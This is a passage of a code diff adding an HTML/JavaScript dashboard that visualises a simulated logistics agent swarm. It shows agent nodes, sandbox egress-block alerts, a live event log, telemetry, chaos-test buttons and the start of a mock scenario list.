+          <!-- Handoff Inter-Agent arcs (Back & forth between agents) -->
+          <path id="wire-glow-support-procurement" class="wire-handoff" d="M 530 180 C 560 210, 560 210, 530 240" />
+          <path id="wire-glow-procurement-dispatch" class="wire-handoff" d="M 530 340 C 560 370, 560 370, 530 400" />
+          <path id="wire-glow-dispatch-support" class="wire-handoff" d="M 470 400 C 420 300, 420 220, 470 180" />
+
+          <!-- Sharp animated wire paths -->
+          <path id="path-stream-support" class="wire-path" d="M 170 290 C 280 290, 320 130, 430 130" />
+          <path id="path-stream-procurement" class="wire-path" d="M 170 290 C 290 290, 330 290, 430 290" />
+          <path id="path-stream-dispatch" class="wire-path" d="M 170 290 C 280 290, 320 450, 430 450" />
+
+          <path id="path-support-sandbox" class="wire-path" d="M 630 130 C 720 130, 750 290, 830 290" />
+          <path id="path-procurement-sandbox" class="wire-path" d="M 630 290 C 730 290, 750 290, 830 290" />
+          <path id="path-dispatch-sandbox" class="wire-path" d="M 630 450 C 720 450, 750 290, 830 290" />
+
+          <path id="path-support-procurement" class="wire-handoff" d="M 530 180 C 560 210, 560 210, 530 240" />
+          <path id="path-procurement-support" class="wire-handoff" d="M 510 240 C 480 210, 480 210, 510 180" />
+          <path id="path-procurement-dispatch" class="wire-handoff" d="M 530 340 C 560 370, 560 370, 530 400" />
+          <path id="path-dispatch-procurement" class="wire-handoff" d="M 510 400 C 480 370, 480 370, 510 340" />
+          <path id="path-dispatch-support" class="wire-handoff" d="M 460 400 C 410 300, 410 220, 460 180" />
+          <path id="path-support-dispatch" class="wire-handoff" d="M 450 180 C 400 220, 400 300, 450 400" />
+        </g>
+
+        <!-- Pulses animation container -->
+        <g id="pulses-layer"></g>
+
+        <!-- Nodes Layer -->
+        <g id="nodes-layer">
+          <!-- 1. LEFT NODE: Event Stream -->
+          <g id="node-stream" class="node-box" transform="translate(30, 230)">
+            <rect class="node-bg" width="140" height="120" />
+            <rect class="node-header-bg" width="140" height="30" rx="6" />
+            <circle class="node-status-circle" cx="18" cy="15" r="4" />
+            <text class="node-title" x="30" y="19" font-size="11">EVENT STREAM</text>
+            <text class="node-subtitle" x="14" y="52">Ingress Pipeline</text>
+            <text class="node-subtitle" x="14" y="70" fill="#00f0ff" id="node-stream-rate">Active · SSE</text>
+            
+            <g transform="translate(14, 86)">
+              <rect width="112" height="22" rx="3" fill="rgba(0,240,255,0.06)" stroke="rgba(0,240,255,0.2)" stroke-width="1"/>
+              <text x="56" y="15" text-anchor="middle" font-family="ui-monospace" font-size="10" fill="#00f0ff" id="stream-events-count">0 msgs</text>
+            </g>
+          </g>
+
+          <!-- 2. MIDDLE COLUMN AGENT NODES -->
+          <!-- Agent: Support -->
+          <g id="node-support" class="node-box" transform="translate(430, 80)">
+            <rect class="node-bg" width="200" height="100" />
+            <rect class="node-header-bg" width="200" height="30" rx="6" />
+            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-support-dot"/>
+            <text class="node-title" x="30" y="19">SUPPORT AGENT</text>
+            
+            <text class="node-subtitle" x="16" y="50">Customer & Ticket Ingest</text>
+            <g transform="translate(16, 62)">
+              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
+              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="support-status-line">IDLE · Standby</text>
+            </g>
+          </g>
+
+          <!-- Agent: Procurement -->
+          <g id="node-procurement" class="node-box" transform="translate(430, 240)">
+            <rect class="node-bg" width="200" height="100" />
+            <rect class="node-header-bg" width="200" height="30" rx="6" />
+            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-procurement-dot"/>
+            <text class="node-title" x="30" y="19">PROCUREMENT</text>
+            
+            <text class="node-subtitle" x="16" y="50">Suppliers, Fuel, POs</text>
+            <g transform="translate(16, 62)">
+              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
+              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="procurement-status-line">IDLE · Standby</text>
+            </g>
+          </g>
+
+          <!-- Agent: Dispatch -->
+          <g id="node-dispatch" class="node-box" transform="translate(430, 400)">
+            <rect class="node-bg" width="200" height="100" />
+            <rect class="node-header-bg" width="200" height="30" rx="6" />
+            <circle class="node-status-circle" cx="18" cy="15" r="4" id="status-dispatch-dot"/>
+            <text class="node-title" x="30" y="19">DISPATCH AGENT</text>
+            
+            <text class="node-subtitle" x="16" y="50">Routing, Carriers, Docks</text>
+            <g transform="translate(16, 62)">
+              <rect width="168" height="26" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(255,255,255,0.08)"/>
+              <text x="10" y="17" font-family="ui-monospace" font-size="10.5" fill="#c9d1d9" id="dispatch-status-line">IDLE · Standby</text>
+            </g>
+          </g>
+
+          <!-- 3. RIGHT NODE: Sandbox Policy -->
+          <g id="node-sandbox" class="node-box" transform="translate(830, 220)">
+            <rect class="node-bg" width="145" height="140" id="sandbox-bg-rect"/>
+            <rect class="node-header-bg" width="145" height="30" rx="6" id="sandbox-header-rect"/>
+            
+            <!-- Shield Icon -->
+            <g transform="translate(14, 8)">
+              <path d="M6 1 L1 4 V8 C1 12 6 15 6 15 C6 15 11 12 11 8 V4 Z" fill="none" stroke="#00ff88" stroke-width="1.5" id="sandbox-shield"/>
+            </g>
+
+            <text class="node-title" x="32" y="19" font-size="10" id="sandbox-title-text">SANDBOX</text>
+            <text class="node-subtitle" x="12" y="50" font-weight="600" fill="#f0f6fc">Policy Enforcer</text>
+            <text class="node-subtitle" x="12" y="66" fill="#8b9bb4">egress allowlist</text>
+            
+            <g transform="translate(12, 80)">
+              <rect width="121" height="46" rx="3" fill="rgba(0,0,0,0.4)" stroke="rgba(0,255,136,0.3)" id="sandbox-badge-box"/>
+              <text x="60" y="19" text-anchor="middle" font-family="ui-monospace" font-size="10" font-weight="700" fill="#00ff88" id="sandbox-policy-status">ENFORCING</text>
+              <text x="60" y="34" text-anchor="middle" font-family="ui-monospace" font-size="8.5" fill="#7d8b99" id="sandbox-quarantined">0 Violations</text>
+            </g>
+          </g>
+        </g>
+      </svg>
+    </main>
+
+    <!-- Right Sidebar: Live Event Log -->
+    <aside id="sidebar-panel">
+      <div class="sidebar-header">
+        <div class="sidebar-title-row">
+          <div class="sidebar-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#00f0ff" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+            <span>Live Swarm Feed</span>
+          </div>
+          <div class="log-counter" id="log-count-badge">0 / 120</div>
+        </div>
+
+        <div class="filter-tabs">
+          <button class="filter-tab active" data-filter="all">All</button>
+          <button class="filter-tab" data-filter="event">Event</button>
+          <button class="filter-tab" data-filter="action">Action</button>
+          <button class="filter-tab" data-filter="handoff">Handoff</button>
+          <button class="filter-tab" data-filter="blocked">Blocked</button>
+          <button class="filter-tab" data-filter="error">Errors</button>
+        </div>
+      </div>
+
+      <div id="log-list"></div>
+    </aside>
+
+    <!-- Bottom Telemetry & Chaos Strip -->
+    <footer id="bottom-bar">
+      <div class="telemetry-group">
+        <div class="telem-item">
+          <span class="telem-label">Model Target</span>
+          <span class="telem-val" id="telem-model">Llama-3-70B-Q4 (Local GB10)</span>
+        </div>
+
+        <div class="telem-item">
+          <span class="telem-label">System Memory</span>
+          <span class="telem-val">
+            <span id="telem-mem">14.8 / 32.0 GB</span>
+            <div class="mem-bar-wrapper">
+              <div class="mem-bar-fill" id="mem-fill" style="width: 46%;"></div>
+            </div>
+          </span>
+        </div>
+
+        <div class="telem-item">
+          <span class="telem-label">Model Latency</span>
+          <span class="telem-val"><span class="accent-cyan" id="telem-latency">142</span> ms</span>
+        </div>
+
+        <div class="telem-item">
+          <span class="telem-label">Inference Speed</span>
+          <span class="telem-val"><span class="accent-green" id="telem-tps">84.6</span> tps</span>
+        </div>
+      </div>
+
+      <div class="chaos-buttons-group">
+        <button class="btn-tactical" id="btn-chaos-supplier" title="Simulate tier-1 supplier failure">
+          <span>Supplier failure</span>
+        </button>
+
+        <button class="btn-tactical" id="btn-chaos-surge" title="Trigger sudden surge of freight tickets">
+          <span>Ticket surge</span>
+        </button>
+
+        <button class="btn-tactical danger" id="btn-chaos-inject" title="Simulate malicious prompt injection email">
+          <span>&#x26A0; Malicious email</span>
+        </button>
+
+        <button class="btn-tactical toggle" id="btn-stream-toggle" title="Pause or resume event stream">
+          <span id="btn-stream-text">Pause stream</span>
+        </button>
+      </div>
+    </footer>
+
+    <!-- Small Footer Line -->
+    <div id="footer-strip">
+      <span class="accent-footer">Inference: local GB10 · No cloud calls</span>
+      <span>Northwind Logistics Swarm v3.4 · Autonomous Sandbox Runtime · 0.0.0.0</span>
+    </div>
+  </div>
+
+  <!-- Audio synthesizers for cinematic command-center sound effects (pure offline Web Audio API) -->
+  <script>
+    // Audio synthesizer helper (0 dependencies, 100% offline)
+    const AudioEngine = {
+      ctx: null,
+      enabled: true,
+      init() {
+        if (!this.ctx && (window.AudioContext || window.webkitAudioContext)) {
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          this.ctx = new AudioContextClass();
+        }
+      },
+      playBlip(freq = 880, duration = 0.04, type = 'sine', gainVal = 0.03) {
+        try {
+          this.init();
+          if (!this.ctx || this.ctx.state === 'suspended') return;
+          const osc = this.ctx.createOscillator();
+          const gain = this.ctx.createGain();
+          osc.type = type;
+          osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
+          gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
+          osc.connect(gain);
+          gain.connect(this.ctx.destination);
+          osc.start();
+          osc.stop(this.ctx.currentTime + duration);
+        } catch (e) {}
+      },
+      playAlarm() {
+        try {
+          this.init();
+          if (!this.ctx) return;
+          if (this.ctx.state === 'suspended') this.ctx.resume();
+          const now = this.ctx.currentTime;
+          const osc = this.ctx.createOscillator();
+          const gain = this.ctx.createGain();
+          osc.type = 'sawtooth';
+          osc.frequency.setValueAtTime(420, now);
+          osc.frequency.exponentialRampToValueAtTime(180, now + 0.35);
+          gain.gain.setValueAtTime(0.09, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+          osc.connect(gain);
+          gain.connect(this.ctx.destination);
+          osc.start();
+          osc.stop(now + 0.4);
+        } catch (e) {}
+      }
+    };
+    window.addEventListener('click', () => AudioEngine.init(), { once: true });
+  </script>
+
+  <!-- Core Mission Control Orchestration Script -->
+  <script>
+    (function () {
+      'use strict';
+
+      // ==========================================
+      // STATE (In-Memory Only)
+      // ==========================================
+      const state = {
+        isMock: false,
+        isPaused: false,
+        stats: {
+          events: 0,
+          resolved: 0,
+          escalated: 0,
+          rerouted: 0,
+          blocked: 0,
+          errors: 0
+        },
+        displayStats: {
+          events: 0,
+          resolved: 0,
+          escalated: 0,
+          rerouted: 0,
+          blocked: 0,
+          errors: 0
+        },
+        logs: [], // Max 120 items
+        activeFilter: 'all',
+        bannerTimer: null,
+        bannerProgressTimer: null,
+        mockInterval: null,
+        telemetry: {
+          model: 'Llama-3-70B-Q4 (Local GB10)',
+          memUsedGB: 16.4,
+          memTotalGB: 32.0,
+          ms: 135,
+          tps: 88.2
+        }
+      };
+
+      // DOM Elements
+      const els = {
+        mockBadge: document.getElementById('mock-badge'),
+        clockTime: document.getElementById('clock-time'),
+        clockUtc: document.getElementById('clock-utc'),
+        valEvents: document.getElementById('val-events'),
+        valResolved: document.getElementById('val-resolved'),
+        valEscalated: document.getElementById('val-escalated'),
+        valRerouted: document.getElementById('val-rerouted'),
+        valBlocked: document.getElementById('val-blocked'),
+        cardBlocked: document.getElementById('card-blocked'),
+        blockedSub: document.getElementById('blocked-sub'),
+        valErrors: document.getElementById('val-errors'),
+        svgStage: document.getElementById('svg-stage'),
+        pulsesLayer: document.getElementById('pulses-layer'),
+        graphPanel: document.getElementById('graph-panel'),
+        banner: document.getElementById('blocked-banner-container'),
+        bannerDetail: document.getElementById('banner-detail-text'),
+        bannerHost: document.getElementById('banner-host-text'),
+        bannerProgress: document.getElementById('banner-progress'),
+        logList: document.getElementById('log-list'),
+        logCountBadge: document.getElementById('log-count-badge'),
+        filterTabs: document.querySelectorAll('.filter-tab'),
+        telemModel: document.getElementById('telem-model'),
+        telemMem: document.getElementById('telem-mem'),
+        memFill: document.getElementById('mem-fill'),
+        telemLatency: document.getElementById('telem-latency'),
+        telemTps: document.getElementById('telem-tps'),
+        nodeStreamRate: document.getElementById('node-stream-rate'),
+        streamEventsCount: document.getElementById('stream-events-count'),
+        supportStatusLine: document.getElementById('support-status-line'),
+        procurementStatusLine: document.getElementById('procurement-status-line'),
+        dispatchStatusLine: document.getElementById('dispatch-status-line'),
+        sandboxPolicyStatus: document.getElementById('sandbox-policy-status'),
+        sandboxQuarantined: document.getElementById('sandbox-quarantined'),
+        btnChaosSupplier: document.getElementById('btn-chaos-supplier'),
+        btnChaosSurge: document.getElementById('btn-chaos-surge'),
+        btnChaosInject: document.getElementById('btn-chaos-inject'),
+        btnStreamToggle: document.getElementById('btn-stream-toggle'),
+        btnStreamText: document.getElementById('btn-stream-text'),
+        nodes: {
+          stream: document.getElementById('node-stream'),
+          support: document.getElementById('node-support'),
+          procurement: document.getElementById('node-procurement'),
+          dispatch: document.getElementById('node-dispatch'),
+          sandbox: document.getElementById('node-sandbox')
+        }
+      };
+
+      // ==========================================
+      // CLOCK
+      // ==========================================
+      function updateClock() {
+        const now = new Date();
+        const pad = (n) => String(n).padStart(2, '0');
+        const h = pad(now.getHours());
+        const m = pad(now.getMinutes());
+        const s = pad(now.getSeconds());
+        els.clockTime.textContent = `${h}:${m}:${s}`;
+        
+        const offset = -now.getTimezoneOffset() / 60;
+        const sign = offset >= 0 ? '+' : '';
+        els.clockUtc.textContent = `UTC${sign}${offset}`;
+      }
+      setInterval(updateClock, 1000);
+      updateClock();
+
+      // ==========================================
+      // COUNT-UP ANIMATION FOR STAT TILES
+      // ==========================================
+      let animationFrameId = null;
+      function animateStats() {
+        let changed = false;
+        const keys = ['events', 'resolved', 'escalated', 'rerouted', 'blocked', 'errors'];
+        
+        for (const k of keys) {
+          const target = state.stats[k] || 0;
+          const current = state.displayStats[k] || 0;
+          if (current < target) {
+            const diff = target - current;
+            const step = Math.max(1, Math.ceil(diff / 6));
+            state.displayStats[k] = Math.min(target, current + step);
+            changed = true;
+          } else if (current > target) {
+            state.displayStats[k] = target;
+            changed = true;
+          }
+        }
+
+        if (changed) {
+          els.valEvents.textContent = state.displayStats.events.toLocaleString();
+          els.valResolved.textContent = state.displayStats.resolved.toLocaleString();
+          els.valEscalated.textContent = state.displayStats.escalated.toLocaleString();
+          els.valRerouted.textContent = state.displayStats.rerouted.toLocaleString();
+          els.valBlocked.textContent = state.displayStats.blocked.toLocaleString();
+          els.valErrors.textContent = state.displayStats.errors.toLocaleString();
+
+          if (state.displayStats.blocked > 0) {
+            els.cardBlocked.classList.add('active-alert');
+            els.blockedSub.textContent = `${state.displayStats.blocked} egress quarantine(s)`;
+            els.sandboxQuarantined.textContent = `${state.displayStats.blocked} Blocked`;
+          }
+
+          els.streamEventsCount.textContent = `${state.displayStats.events} msgs`;
+        }
+
+        animationFrameId = requestAnimationFrame(animateStats);
+      }
+      animationFrameId = requestAnimationFrame(animateStats);
+
+      // ==========================================
+      // SVG PARTICLE & BEAM PULSE ENGINE (60 FPS)
+      // ==========================================
+      const activePulses = [];
+
+      function spawnPulse(pathId, color, glowColor, speed = 1.0, onComplete = null) {
+        const pathElem = document.getElementById(pathId);
+        if (!pathElem) return;
+
+        const pathLength = pathElem.getTotalLength();
+        if (!pathLength) return;
+
+        // Particle element
+        const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+        circle.setAttribute('r', '5');
+        circle.setAttribute('fill', color);
+        circle.setAttribute('filter', glowColor);
+        circle.setAttribute('class', 'pulse-particle');
+
+        // Spark trail
+        const trail = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+        trail.setAttribute('r', '8');
+        trail.setAttribute('fill', color);
+        trail.setAttribute('opacity', '0.35');
+        trail.setAttribute('class', 'pulse-particle');
+
+        els.pulsesLayer.appendChild(trail);
+        els.pulsesLayer.appendChild(circle);
+
+        activePulses.push({
+          circle,
+          trail,
+          pathElem,
+          pathLength,
+          progress: 0,
+          speed: speed * (1400 / Math.max(300, pathLength)), // proportional speed
+          onComplete
+        });
+      }
+
+      function updatePulses() {
+        for (let i = activePulses.length - 1; i >= 0; i--) {
+          const p = activePulses[i];
+          p.progress += 0.024 * p.speed;
+
+          if (p.progress >= 1.0) {
+            if (p.circle.parentNode) p.circle.parentNode.removeChild(p.circle);
+            if (p.trail.parentNode) p.trail.parentNode.removeChild(p.trail);
+            if (p.onComplete) p.onComplete();
+            activePulses.splice(i, 1);
+          } else {
+            const pt = p.pathElem.getPointAtLength(p.progress * p.pathLength);
+            p.circle.setAttribute('cx', pt.x);
+            p.circle.setAttribute('cy', pt.y);
+
+            const trailDist = Math.max(0, (p.progress - 0.05) * p.pathLength);
+            const ptTrail = p.pathElem.getPointAtLength(trailDist);
+            p.trail.setAttribute('cx', ptTrail.x);
+            p.trail.setAttribute('cy', ptTrail.y);
+          }
+        }
+        requestAnimationFrame(updatePulses);
+      }
+      requestAnimationFrame(updatePulses);
+
+      // ==========================================
+      // NODE HIGHLIGHT & INTERACTION
+      // ==========================================
+      function flashNode(nodeKey, highlightClass, duration = 1200) {
+        const node = els.nodes[nodeKey];
+        if (!node) return;
+        node.classList.add(highlightClass);
+        setTimeout(() => {
+          node.classList.remove(highlightClass);
+        }, duration);
+      }
+
+      function updateAgentStatus(agent, text) {
+        if (agent === 'support' && els.supportStatusLine) {
+          els.supportStatusLine.textContent = text;
+        } else if (agent === 'procurement' && els.procurementStatusLine) {
+          els.procurementStatusLine.textContent = text;
+        } else if (agent === 'dispatch' && els.dispatchStatusLine) {
+          els.dispatchStatusLine.textContent = text;
+        }
+      }
+
+      // ==========================================
+      // DRAMATIC BLOCKED VIOLATION SEQUENCE
+      // ==========================================
+      function triggerBlockedSequence(agent, host, detail) {
+        // 1. Audio Alarm
+        AudioEngine.playAlarm();
+
+        // 2. Shake entire graph
+        els.graphPanel.classList.remove('shake-graph');
+        // Force reflow
+        void els.graphPanel.offsetWidth;
+        els.graphPanel.classList.add('shake-graph');
+        setTimeout(() => {
+          els.graphPanel.classList.remove('shake-graph');
+        }, 500);
+
+        // 3. Highlight Sandbox Node in intense red
+        els.nodes.sandbox.classList.add('highlight-blocked');
+        els.sandboxPolicyStatus.textContent = 'VIOLATION DETECTED';
+        els.sandboxPolicyStatus.setAttribute('fill', '#ff2a55');
+
+        setTimeout(() => {
+          els.nodes.sandbox.classList.remove('highlight-blocked');
+          els.sandboxPolicyStatus.textContent = 'ENFORCING';
+          els.sandboxPolicyStatus.setAttribute('fill', '#00ff88');
+        }, 3200);
+
+        // 4. Show Dramatic Banner for exactly 3 seconds with countdown
+        if (state.bannerTimer) clearTimeout(state.bannerTimer);
+        if (state.bannerProgressTimer) clearInterval(state.bannerProgressTimer);
+
+        els.bannerDetail.textContent = detail || 'Unauthorized outbound call was quarantined by policy rule.';
+        els.bannerHost.textContent = `TARGET HOST: ${host || 'untrusted-external-domain'}`;
+        els.banner.classList.add('visible');
+        els.bannerProgress.style.transform = 'scaleX(1)';
+
+        const bannerDuration = 3000;
+        const startTime = Date.now();
+
+        state.bannerProgressTimer = setInterval(() => {
+          const elapsed = Date.now() - startTime;
+          const remaining = Math.max(0, 1 - (elapsed / bannerDuration));
+          els.bannerProgress.style.transform = `scaleX(${remaining})`;
+          if (remaining <= 0) {
+            clearInterval(state.bannerProgressTimer);
+          }
+        }, 20);
+
+        state.bannerTimer = setTimeout(() => {
+          els.banner.classList.remove('visible');
+        }, bannerDuration);
+      }
+
+      // ==========================================
+      // LIVE EVENT LOG
+      // ==========================================
+      function addLogItem(msg) {
+        const item = {
+          id: msg.id || 'evt-' + Math.random().toString(36).substring(2, 8),
+          t: msg.t || Date.now(),
+          type: msg.type || 'event',
+          agent: msg.agent || (msg.from ? `${msg.from} → ${msg.to}` : 'system'),
+          detail: msg.detail || '',
+          extra: msg
+        };
+
+        // Prepend to in-memory logs (newest first, max 120)
+        state.logs.unshift(item);
+        if (state.logs.length > 120) {
+          state.logs.pop();
+        }
+
+        els.logCountBadge.textContent = `${state.logs.length} / 120`;
+
+        renderSingleLogItem(item, true);
+      }
+
+      function formatLogTime(t) {
+        const d = new Date(t);
+        const pad = (n) => String(n).padStart(2, '0');
+        const ms = String(d.getMilliseconds()).padStart(3, '0');
+        return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${ms}`;
+      }
+
+      function renderSingleLogItem(item, prepend = true) {
+        // Check filter
+        if (state.activeFilter !== 'all' && item.type !== state.activeFilter) {
+          return;
+        }
+
+        const div = document.createElement('div');
+        div.className = `log-item type-${item.type}`;
+        div.setAttribute('data-type', item.type);
+
+        let typeBadgeClass = 'badge-event';
+        let typeBadgeLabel = item.type.toUpperCase();
+        if (item.type === 'action') typeBadgeClass = 'badge-action';
+        else if (item.type === 'handoff') typeBadgeLabel = 'HANDOFF';
+        else if (item.type === 'blocked') typeBadgeClass = 'badge-blocked';
+        else if (item.type === 'error') typeBadgeClass = 'badge-error';
+
+        let extraLine = '';
+        if (item.type === 'action' && item.extra.tool) {
+          extraLine = `<div class="log-extra-line"><span>Tool:</span> <span class="highlight">${item.extra.tool}()</span></div>`;
+        } else if (item.type === 'blocked' && item.extra.host) {
+          extraLine = `<div class="log-extra-line"><span style="color:#ff4466;">Egress Host:</span> <span class="highlight" style="color:#ffb700;">${item.extra.host}</span></div>`;
+        } else if (item.type === 'event' && item.extra.kind) {
+          extraLine = `<div class="log-extra-line"><span>Kind:</span> <span class="highlight">${item.extra.kind}</span></div>`;
+        }
+
+        div.innerHTML = `
+          <div class="log-header-line">
+            <span class="log-time">${formatLogTime(item.t)}</span>
+            <div class="log-tags">
+              <span class="agent-pill">${item.agent}</span>
+              <span class="log-badge ${typeBadgeClass}">${typeBadgeLabel}</span>
+            </div>
+          </div>
+          <div class="log-detail-line">${escapeHtml(item.detail)}</div>
+          ${extraLine}
+        `;
+
+        if (prepend && els.logList.firstChild) {
+          els.logList.insertBefore(div, els.logList.firstChild);
+        } else {
+          els.logList.appendChild(div);
+        }
+
+        // Limit DOM items to 120
+        while (els.logList.children.length > 120) {
+          els.logList.removeChild(els.logList.lastChild);
+        }
+      }
+
+      function reRenderLogs() {
+        els.logList.innerHTML = '';
+        const filtered = state.activeFilter === 'all'
+          ? state.logs
+          : state.logs.filter(l => l.type === state.activeFilter);
+
+        for (const item of filtered) {
+          renderSingleLogItem(item, false);
+        }
+      }
+
+      function escapeHtml(str) {
+        if (!str) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;')
+          .replace(/'/g, '&#39;');
+      }
+
+      // Filter tabs event listeners
+      els.filterTabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+          els.filterTabs.forEach(t => t.classList.remove('active'));
+          tab.classList.add('active');
+          state.activeFilter = tab.getAttribute('data-filter');
+          reRenderLogs();
+        });
+      });
+
+      // ==========================================
+      // TELEMETRY & SYSTEM UPDATES
+      // ==========================================
+      function updateTelemetry(telem) {
+        if (telem.ms !== undefined) {
+          state.telemetry.ms = telem.ms;
+          els.telemLatency.textContent = telem.ms;
+          els.telemLatency.className = telem.ms > 300 ? 'accent-amber' : 'accent-cyan';
+        }
+        if (telem.tps !== undefined) {
+          state.telemetry.tps = telem.tps;
+          els.telemTps.textContent = Number(telem.tps).toFixed(1);
+        }
+      }
+
+      function updateSystem(sys) {
+        if (sys.model) {
+          state.telemetry.model = sys.model;
+          els.telemModel.textContent = sys.model;
+        }
+        if (sys.memUsedGB !== undefined && sys.memTotalGB !== undefined) {
+          state.telemetry.memUsedGB = sys.memUsedGB;
+          state.telemetry.memTotalGB = sys.memTotalGB;
+          els.telemMem.textContent = `${Number(sys.memUsedGB).toFixed(1)} / ${Number(sys.memTotalGB).toFixed(1)} GB`;
+          const pct = Math.min(100, Math.max(5, (sys.memUsedGB / sys.memTotalGB) * 100));
+          els.memFill.style.width = `${pct}%`;
+        }
+      }
+
+      // ==========================================
+      // MESSAGE PROCESSOR (Real SSE or Mock)
+      // ==========================================
+      function handleMessage(msg) {
+        if (!msg || typeof msg !== 'object') return;
+
+        // Sync stats if provided
+        if (msg.stats) {
+          for (const k in msg.stats) {
+            if (state.stats.hasOwnProperty(k)) {
+              state.stats[k] = msg.stats[k];
+            }
+          }
+        }
+
+        const type = msg.type;
+        const agent = (msg.agent || '').toLowerCase();
+
+        // 1. "event": Event Stream -> Agent pulse + highlight agent
+        if (type === 'event') {
+          AudioEngine.playBlip(720, 0.03, 'sine', 0.02);
+          flashNode('stream', 'highlight-event', 400);
+
+          let pathId = 'path-stream-procurement';
+          if (agent === 'support') pathId = 'path-stream-support';
+          else if (agent === 'dispatch') pathId = 'path-stream-dispatch';
+
+          spawnPulse(pathId, '#00f0ff', 'url(#glow-cyan)', 1.2, () => {
+            flashNode(agent, 'highlight-event', 800);
+            updateAgentStatus(agent, msg.kind || 'Processing Event');
+          });
+
+          addLogItem(msg);
+        }
+
+        // 2. "action": Agent -> Sandbox Policy green pulse + tool display
+        else if (type === 'action') {
+          AudioEngine.playBlip(960, 0.04, 'sine', 0.02);
+          let pathId = 'path-procurement-sandbox';
+          if (agent === 'support') pathId = 'path-support-sandbox';
+          else if (agent === 'dispatch') pathId = 'path-dispatch-sandbox';
+
+          flashNode(agent, 'highlight-action', 600);
+          updateAgentStatus(agent, msg.tool ? `tool: ${msg.tool}` : 'Executed Action');
+
+          spawnPulse(pathId, '#00ff88', 'url(#glow-green)', 1.4, () => {
+            flashNode('sandbox', 'highlight-action', 500);
+          });
+
+          addLogItem(msg);
+        }
+
+        // 3. "handoff": from -> to yellow pulse
+        else if (type === 'handoff') {
+          AudioEngine.playBlip(620, 0.05, 'triangle', 0.025);
+          const from = (msg.from || '').toLowerCase();
+          const to = (msg.to || '').toLowerCase();
+
+          flashNode(from, 'highlight-handoff', 700);
+          updateAgentStatus(from, `Handoff -> ${to}`);
+
+          let pathId = `path-${from}-${to}`;
+          if (!document.getElementById(pathId)) {
+            // fallback
+            pathId = 'path-support-procurement';
+          }
+
+          spawnPulse(pathId, '#ffb700', 'url(#glow-amber)', 1.1, () => {
+            flashNode(to, 'highlight-handoff', 800);
+            updateAgentStatus(to, `Received from ${from}`);
+          });
+
+          msg.detail = msg.detail || `Inter-agent handoff of freight task from ${from} to ${to}`;
+          addLogItem(msg);
+        }
+
+        // 4. "blocked": dramatic quarantine incident
+        else if (type === 'blocked') {
+          let pathId = 'path-procurement-sandbox';
+          if (agent === 'support') pathId = 'path-support-sandbox';
+          else if (agent === 'dispatch') pathId = 'path-dispatch-sandbox';
+
+          flashNode(agent, 'highlight-blocked', 1200);
+          updateAgentStatus(agent, 'BLOCKED VIOLATION');
+
+          spawnPulse(pathId, '#ff2a55', 'url(#glow-red)', 1.8, () => {
+            triggerBlockedSequence(agent, msg.host, msg.detail);
+          });
+
+          addLogItem(msg);
+        }
+
+        // 5. "telemetry": model latency & tps
+        else if (type === 'telemetry') {
+          updateTelemetry(msg);
+        }
+
+        // 6. "sys": memory & model name
+        else if (type === 'sys') {
+          updateSystem(msg);
+        }
+
+        // 7. "error": agent execution fault
+        else if (type === 'error') {
+          AudioEngine.playBlip(220, 0.08, 'sawtooth', 0.04);
+          if (agent) flashNode(agent, 'highlight-blocked', 900);
+          addLogItem(msg);
+        }
+      }
+
+      // ==========================================
+      // REAL BACKEND CONNECTION & MOCK FALLBACK
+      // ==========================================
+      let sse = null;
+      let connectedToReal = false;
+      const forceMock = window.location.search.includes('mock=1');
+
+      function initConnection() {
+        if (forceMock) {
+          enableMockMode('Requested via ?mock=1 URL parameter');
+          return;
+        }
+
+        let connectTimeout = setTimeout(() => {
+          if (!connectedToReal) {
+            console.warn('[MissionControl] SSE /events timeout (2000ms), failing over to MOCK MODE.');
+            enableMockMode('Connection timeout to /events (2s)');
+          }
+        }, 2000);
+
+        try {
+          sse = new EventSource('/events');
+
+          sse.onopen = () => {
+            connectedToReal = true;
+            clearTimeout(connectTimeout);
+            console.log('[MissionControl] Connected to live SSE at /events');
+          };
+
+          sse.onmessage = (e) => {
+            connectedToReal = true;
+            clearTimeout(connectTimeout);
+            try {
+              const data = JSON.parse(e.data);
+              handleMessage(data);
+            } catch (err) {
+              console.error('[MissionControl] Failed to parse SSE JSON:', err);
+            }
+          };
+
+          sse.onerror = (err) => {
+            if (!connectedToReal) {
+              clearTimeout(connectTimeout);
+              console.warn('[MissionControl] SSE error before connection, engaging MOCK MODE:', err);
+              enableMockMode('SSE connection failed');
+            }
+          };
+        } catch (e) {
+          clearTimeout(connectTimeout);
+          enableMockMode('Exception initializing EventSource');
+        }
+      }
+
+      // ==========================================
+      // REALISTIC BUILT-IN MOCK SIMULATOR
+      // ==========================================
+      const MOCK_SCENARIOS = {
+        support: [
+          { kind: 'temp_alarm', detail: 'Reefer trailer #8902 temp delta +3.8°C at Chicago Intermodal Yard' },
+          { kind: 'client_query', detail: 'Priority inquiry from Acme Corp: Expedited delivery status on PO-99124' },
+          { kind: 'claim_file', detail: 'Damaged pallet claim submitted for Denver cross-dock shipment' },
+          { kind: 'customs_hold', detail: 'Inbound LTL shipment held at Detroit Ambassador Bridge for manifest inspection' },
